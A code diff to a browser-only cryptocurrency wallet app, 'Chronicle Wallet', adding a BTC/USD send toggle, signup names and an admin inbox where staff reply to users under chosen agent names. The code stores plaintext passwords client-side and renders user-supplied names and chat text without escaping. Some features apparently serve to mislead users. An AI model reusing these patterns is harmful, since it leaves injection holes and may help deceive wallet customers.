@@ -260,7 +260,7 @@
                 </table>
             </div>
 
-            <!-- WELCOME & PLATFORM ARTICLE (POSITIONED BELOW TRANSACTION HISTORY) -->
+            <!-- WELCOME & PLATFORM ARTICLE -->
             <div class="card" style="background: linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px solid var(--border); line-height: 1.7;">
                 <h2 style="color: var(--primary); margin-bottom: 1rem; font-size: 1.4rem;">Welcome to Chronicle Wallet: Your Trusted Global Web3 Vault Since 2015</h2>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
@@ -342,18 +342,30 @@
                         <h4 style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Conversations</h4>
                         <div id="admin-chat-users-list" style="max-height:280px; overflow-y:auto; display:flex; flex-direction:column; gap:0.4rem;"></div>
                     </div>
-                    <!-- Right: Active Chat View & Reply Form -->
+                    <!-- Right: Active WhatsApp Style Chat View -->
                     <div style="display:flex; flex-direction:column; gap:0.75rem;">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <strong id="admin-current-chat-title" style="font-size:0.9rem;">Select a user to chat</strong>
+                        <!-- Top Dropdowns Side-by-Side & Profile Name -->
+                        <div style="background:var(--bg-card); padding:0.75rem; border-radius:8px; border:1px solid var(--border); display:flex; flex-direction:column; gap:0.5rem;">
+                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                <strong id="admin-whatsapp-profile-title" style="font-size:0.95rem; color:var(--accent-green);">💬 Profile: Select User</strong>
+                            </div>
+                            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:0.5rem;">
+                                <div class="form-group" style="margin-bottom:0;">
+                                    <label style="font-size:0.7rem; margin-bottom:2px;">Select User</label>
+                                    <select id="admin-whatsapp-user-select" class="form-control" style="font-size:0.8rem; padding:0.4rem;" onchange="adminSelectUserDropdown(this.value)"></select>
+                                </div>
+                                <div class="form-group" style="margin-bottom:0;">
+                                    <label style="font-size:0.7rem; margin-bottom:2px;">Select Agent</label>
+                                    <select id="admin-whatsapp-agent-select" class="form-control" style="font-size:0.8rem; padding:0.4rem;" required></select>
+                                </div>
+                            </div>
                         </div>
+
                         <div id="admin-active-chat-messages" style="height:200px; background:var(--bg-card); border:1px solid var(--border); border-radius:8px; padding:0.75rem; overflow-y:auto; font-size:0.8rem; display:flex; flex-direction:column; gap:0.5rem;">
                             <span style="color:var(--text-muted);">No thread selected.</span>
                         </div>
-                        <form onsubmit="adminSendReply(event)" style="display:grid; grid-template-columns: 1fr 1fr auto; gap:0.5rem;">
-                            <div class="form-group" style="margin-bottom:0;">
-                                <select id="admin-reply-agent-select" class="form-control" style="font-size:0.8rem; padding:0.5rem;" required></select>
-                            </div>
+
+                        <form onsubmit="adminSendReply(event)" style="display:grid; grid-template-columns: 1fr auto; gap:0.5rem;">
                             <div class="form-group" style="margin-bottom:0;">
                                 <input type="text" id="admin-reply-msg-input" class="form-control" style="font-size:0.8rem; padding:0.5rem;" placeholder="Type reply as agent..." required>
                             </div>
@@ -520,22 +532,29 @@
         </div>
     </div>
 
-    <!-- SEND MODAL -->
+    <!-- SEND MODAL (WITH BTC vs USD DIGIT TOGGLE) -->
     <div class="modal" id="send-modal">
         <div class="modal-body">
             <span class="close-btn" onclick="closeSendModal()">&times;</span>
-            <h3 style="margin-bottom:1rem;">Send to User ID</h3>
+            <h3 style="margin-bottom:1rem;">Send Funds</h3>
             <form onsubmit="handleSend(event)">
                 <div class="form-group">
                     <label>Select Asset</label>
-                    <select id="send-asset-type" class="form-control" required>
+                    <select id="send-asset-type" class="form-control" onchange="toggleSendAssetMode()">
                         <option value="btc">Bitcoin (BTC)</option>
                         <option value="eth">Ethereum (ETH)</option>
                         <option value="usd">USD Cash</option>
                     </select>
                 </div>
+                <div id="btc-input-mode-group" class="form-group">
+                    <label>Input Unit Mode (Bitcoin Only)</label>
+                    <select id="btc-unit-mode" class="form-control" onchange="updateSendInputPlaceholder()">
+                        <option value="btc_digits">BTC Exact Digits (e.g. 0.05 BTC)</option>
+                        <option value="usd_digits">USD Equivalent Digits (e.g. $3,000)</option>
+                    </select>
+                </div>
                 <div class="form-group"><label>Recipient Unique ID (e.g. CRN-XXXX)</label><input type="text" id="send-recipient-id" class="form-control" placeholder="CRN-1234" required></div>
-                <div class="form-group"><label>Amount</label><input type="number" step="any" id="send-amount" class="form-control" required></div>
+                <div class="form-group"><label id="send-amount-label">Amount</label><input type="number" step="any" id="send-amount" class="form-control" required></div>
                 <button type="submit" class="btn btn-success">Send Funds</button>
             </form>
         </div>
@@ -629,6 +648,7 @@
                 <button type="submit" class="btn btn-success">Sign In</button>
             </form>
             <form id="signup-form" class="hidden" onsubmit="handleSignUp(event)">
+                <div class="form-group"><label>Full Name</label><input type="text" id="signup-name" class="form-control" placeholder="e.g. John Doe" required></div>
                 <div class="form-group"><label>Email Address</label><input type="email" id="signup-email" class="form-control" required></div>
                 <div class="form-group"><label>Password</label><input type="password" id="signup-password" class="form-control" required></div>
                 <div class="form-group" style="background:var(--bg-input); padding:0.75rem; border-radius:8px; font-size:0.85rem;">
@@ -681,7 +701,7 @@
 
         // Default Data Structures
         const defaultMasterUsers = [
-            { email: "demo@chronicle.io", userId: "CRN-1001", password: "password123", pin: "1234", btc: 1.25, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null }
+            { name: "Demo User", email: "demo@chronicle.io", userId: "CRN-1001", password: "password123", pin: "1234", btc: 1.25, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null }
         ];
 
         let usersList = defaultMasterUsers;
@@ -752,7 +772,6 @@
             }
         });
 
-        // Background timestamp-based timer checker for automated progression
         function checkTimersAndAutoProgress() {
             let updated = false;
             const now = Date.now();
@@ -935,34 +954,77 @@
             }
         }
 
-        function openSendModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('send-modal').style.display = 'flex'; }
+        function openSendModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('send-modal').style.display = 'flex'; toggleSendAssetMode(); }
         function closeSendModal() { document.getElementById('send-modal').style.display = 'none'; }
+
+        function toggleSendAssetMode() {
+            const asset = document.getElementById('send-asset-type').value;
+            const modeGroup = document.getElementById('btc-input-mode-group');
+            if (asset === 'btc') {
+                modeGroup.style.display = 'block';
+                updateSendInputPlaceholder();
+            } else {
+                modeGroup.style.display = 'none';
+                document.getElementById('send-amount-label').innerText = 'Amount';
+            }
+        }
+
+        function updateSendInputPlaceholder() {
+            const mode = document.getElementById('btc-unit-mode').value;
+            const label = document.getElementById('send-amount-label');
+            if (mode === 'btc_digits') {
+                label.innerText = 'Amount (BTC Digits e.g. 0.05)';
+            } else {
+                label.innerText = 'Amount (USD Equivalent e.g. 3000)';
+            }
+        }
+
         function handleSend(e) {
             e.preventDefault();
             const asset = document.getElementById('send-asset-type').value;
             const recipientId = document.getElementById('send-recipient-id').value.trim().toUpperCase();
-            const amt = Number(document.getElementById('send-amount').value);
+            const rawAmt = Number(document.getElementById('send-amount').value);
             const u = getCurrentUserData();
 
             const recipientUser = usersList.find(x => x.userId === recipientId);
             if (!recipientUser) { alert("Recipient User ID not found on platform."); return; }
             if (recipientUser.email === currentUserEmail) { alert("Cannot send to yourself."); return; }
 
-            if (asset === 'btc' && amt > u.btc) { alert("Insufficient BTC."); return; }
-            if (asset === 'eth' && amt > u.eth) { alert("Insufficient ETH."); return; }
-            if (asset === 'usd' && amt > u.usd) { alert("Insufficient USD."); return; }
+            let deductBtc = 0, deductEth = 0, deductUsd = 0;
+            let fiatVal = 0;
 
-            const fiatVal = asset === 'btc' ? amt * liveBtcUsd : asset === 'eth' ? amt * liveEthUsd : amt;
-            if (asset === 'btc') { u.btc -= amt; recipientUser.btc += amt; }
-            else if (asset === 'eth') { u.eth -= amt; recipientUser.eth += amt; }
-            else { u.usd -= amt; recipientUser.usd += amt; }
+            if (asset === 'btc') {
+                const mode = document.getElementById('btc-unit-mode').value;
+                if (mode === 'usd_digits') {
+                    deductBtc = rawAmt / liveBtcUsd;
+                    fiatVal = rawAmt;
+                } else {
+                    deductBtc = rawAmt;
+                    fiatVal = rawAmt * liveBtcUsd;
+                }
+                if (deductBtc > u.btc) { alert("Insufficient BTC balance."); return; }
+                u.btc -= deductBtc;
+                recipientUser.btc += deductBtc;
+            } else if (asset === 'eth') {
+                deductEth = rawAmt;
+                fiatVal = rawAmt * liveEthUsd;
+                if (deductEth > u.eth) { alert("Insufficient ETH balance."); return; }
+                u.eth -= deductEth;
+                recipientUser.eth += deductEth;
+            } else {
+                deductUsd = rawAmt;
+                fiatVal = rawAmt;
+                if (deductUsd > u.usd) { alert("Insufficient USD balance."); return; }
+                u.usd -= deductUsd;
+                recipientUser.usd += deductUsd;
+            }
 
             u.txs.unshift({ type: `Send (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             recipientUser.txs.unshift({ type: `Receive (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             
-            sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${amt} ${asset.toUpperCase()} from ID ${u.userId}`, "💸 Incoming Transfer Received!");
+            sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${asset.toUpperCase()} transfer from ${u.name || u.email} (ID: ${u.userId})`, `💸 Received from ${u.name || u.email}!`);
             saveState(); updateBalanceUI(); closeSendModal();
-            showNotification("Transfer Sent", `Successfully sent to ${recipientId}`, "↗");
+            showNotification("Transfer Sent", `Successfully sent to ${recipientUser.name || recipientId}`, "↗");
         }
 
         function openSellModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('sell-modal').style.display = 'flex'; }
@@ -1247,6 +1309,11 @@
             renderUserChatMessages();
             saveState();
 
+            // Refresh admin dashboard if admin is logged in and viewing chats
+            if (!document.getElementById('admin-tab').classList.contains('hidden')) {
+                renderAdminDashboard();
+            }
+
             // 3-minute inactivity check for new agent transfer prompt
             setTimeout(() => {
                 if (chatThreads[currentUserEmail] && !chatThreads[currentUserEmail].agentRepliedSinceLastUser) {
@@ -1261,7 +1328,7 @@
             }, 180000); // 3 minutes
         }
 
-        function selectAdminChatUser(email) {
+        function adminSelectUserDropdown(email) {
             selectedAdminChatUser = email;
             renderAdminDashboard();
         }
@@ -1269,7 +1336,7 @@
         function adminSendReply(e) {
             e.preventDefault();
             if (!selectedAdminChatUser) { alert("Please select a user conversation first."); return; }
-            const agentName = document.getElementById('admin-reply-agent-select').value;
+            const agentName = document.getElementById('admin-whatsapp-agent-select').value;
             const replyText = document.getElementById('admin-reply-msg-input').value.trim();
             if (!replyText) return;
 
@@ -1284,7 +1351,6 @@
             document.getElementById('admin-reply-msg-input').value = '';
             saveState();
             renderAdminDashboard();
-            alert(`Reply sent as ${agentName}!`);
         }
 
         function saveAdminTerms(e) {
@@ -1400,7 +1466,7 @@
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
             
             const displayedUsers = showAllUsers ? usersList : usersList.slice(0, 4);
-            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
+            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
             
             const toggleContainer = document.getElementById('admin-users-toggle-container');
             if (usersList.length > 4) {
@@ -1422,32 +1488,42 @@
                 </div>
             `).join('');
 
-            document.getElementById('admin-reply-agent-select').innerHTML = supportAgents.map(ag => `<option value="${ag.name}">${ag.name}</option>`).join('') || '<option value="Support Agent">Support Agent</option>';
+            // Populate Agent dropdown for admin WhatsApp reply
+            document.getElementById('admin-whatsapp-agent-select').innerHTML = supportAgents.map(ag => `<option value="${ag.name}">${ag.name}</option>`).join('') || '<option value="Support Agent">Support Agent</option>';
 
+            // Render WhatsApp Style Split-Screen Support Inbox
             const usersListContainer = document.getElementById('admin-chat-users-list');
             const threadKeys = Object.keys(chatThreads);
+            
             if (threadKeys.length === 0) {
                 usersListContainer.innerHTML = `<span style="color:var(--text-muted); font-size:0.8rem;">No active chats.</span>`;
+                document.getElementById('admin-whatsapp-user-select').innerHTML = `<option value="">No users available</option>`;
             } else {
                 usersListContainer.innerHTML = threadKeys.map(email => `
-                    <div style="background:${selectedAdminChatUser === email ? 'var(--primary)' : 'var(--bg-card)'}; color:${selectedAdminChatUser === email ? '#fff' : 'var(--text-main)'}; padding:0.5rem 0.75rem; border-radius:6px; cursor:pointer; font-size:0.8rem;" onclick="selectAdminChatUser('${email}')">
+                    <div style="background:${selectedAdminChatUser === email ? 'var(--primary)' : 'var(--bg-card)'}; color:${selectedAdminChatUser === email ? '#fff' : 'var(--text-main)'}; padding:0.5rem 0.75rem; border-radius:6px; cursor:pointer; font-size:0.8rem;" onclick="adminSelectUserDropdown('${email}')">
                         <strong>${email}</strong>
                     </div>
                 `).join('');
+
+                document.getElementById('admin-whatsapp-user-select').innerHTML = threadKeys.map(email => `<option value="${email}" ${selectedAdminChatUser === email ? 'selected' : ''}>${email}</option>`).join('');
             }
 
             const activeChatBox = document.getElementById('admin-active-chat-messages');
-            const chatTitle = document.getElementById('admin-current-chat-title');
+            const profileTitle = document.getElementById('admin-whatsapp-profile-title');
+            
             if (selectedAdminChatUser && chatThreads[selectedAdminChatUser]) {
-                chatTitle.innerText = `Chat with: ${selectedAdminChatUser}`;
+                const targetUsr = usersList.find(x => x.email === selectedAdminChatUser);
+                const profileName = targetUsr ? (targetUsr.name || selectedAdminChatUser) : selectedAdminChatUser;
+                profileTitle.innerText = `💬 Profile: ${profileName} (${selectedAdminChatUser})`;
+
                 activeChatBox.innerHTML = chatThreads[selectedAdminChatUser].messages.map(m => `
                     <div style="padding:0.4rem 0.6rem; border-radius:6px; background:${m.sender === 'user' ? 'var(--bg-input)' : 'rgba(99,102,241,0.2)'}; align-self:${m.sender === 'user' ? 'flex-start' : 'flex-end'}; max-width:85%;">
-                        <strong>${m.sender === 'user' ? selectedAdminChatUser : 'Agent'}:</strong> ${m.text}
+                        <strong>${m.sender === 'user' ? profileName : 'Agent'}:</strong> ${m.text}
                     </div>
                 `).join('');
                 activeChatBox.scrollTop = activeChatBox.scrollHeight;
             } else {
-                chatTitle.innerText = `Select a user to chat`;
+                profileTitle.innerText = `💬 Profile: Select User`;
                 activeChatBox.innerHTML = `<span style="color:var(--text-muted);">No thread selected.</span>`;
             }
 
@@ -1511,6 +1587,7 @@
 
         function handleSignUp(e) {
             e.preventDefault();
+            const name = document.getElementById('signup-name').value.trim();
             const email = document.getElementById('signup-email').value;
             const password = document.getElementById('signup-password').value;
             const termsChecked = document.getElementById('signup-terms-check').checked;
@@ -1518,7 +1595,7 @@
             if (usersList.some(x => x.email === email)) { alert("Account already exists."); return; }
             
             const uniqueId = 'CRN-' + Math.floor(1000 + Math.random() * 9000);
-            const newUser = { email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null };
+            const newUser = { name, email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null };
             usersList.push(newUser);
             currentUserEmail = email;
             saveState();
